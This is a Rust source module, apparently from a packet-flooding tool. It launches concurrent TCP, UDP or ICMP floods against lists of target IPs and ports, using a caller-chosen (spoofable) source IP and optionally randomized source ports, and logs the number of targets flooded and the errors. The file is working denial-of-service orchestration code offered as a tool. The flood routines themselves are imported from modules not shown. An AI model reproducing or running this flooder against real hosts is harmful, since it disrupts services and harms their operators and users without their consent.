use super::{icmp_flood::icmp_flood, udp_flood::udp_flood};
use crate::{
    flooder::tcp_flood::tcp_flood,
    networking::{interface::Interface, socket_iterator::SocketIterator},
};
use futures::future::join_all;
use log::info;
use rand::Rng;
use std::net::IpAddr;

#[derive(Debug)]
pub enum FloodMethod {
    Tcp,
    Udp,
    Icmp,
}

pub struct Flooder;

impl Flooder {
    #[allow(clippy::too_many_arguments)]
    pub async fn flood(
        interface: Interface,
        method: FloodMethod,
        src_ip: IpAddr,
        src_port: u16,
        ip_addresses: &[IpAddr],
        port_numbers: &[u16],
        number_of_packets: usize,
        should_randomize_ports: bool,
    ) {
        let total_targets = ip_addresses.len();
        let total_ports = port_numbers.len();

        let sockets = SocketIterator::new(ip_addresses, port_numbers);

        let flood_method = match method {
            FloodMethod::Tcp => tcp_flood,
            FloodMethod::Udp => udp_flood,
            FloodMethod::Icmp => icmp_flood,
        };

        let mut handles = Vec::new();

        for socket in sockets {
            let origin_port = if !should_randomize_ports {
                src_port
            } else {
                let mut rng = rand::thread_rng();
                rng.gen_range(1..=65535)
            };

            let handle = tokio::spawn(async move {
                let status = tokio::task::spawn_blocking(move || {
                    flood_method(
                        interface,
                        src_ip,
                        origin_port,
                        socket.ip(),
                        socket.port(),
                        number_of_packets,
                    )
                })
                .await
                .unwrap();
                (socket, status)
            });

            handles.push(handle);
        }

        let results = join_all(handles).await;

        let mut errors = 0;

        for result in results {
            match result {
                Ok(_) => (),
                Err(_) => errors += 1,
            }
        }

        let total_packets = total_ports * number_of_packets;

        info!(
            "Flooded {} targets with {} packets each.",
            total_targets, total_packets
        );

        info!(
            "There were {} errors while trying to flood the sockets.",
            errors
        );
    }
}
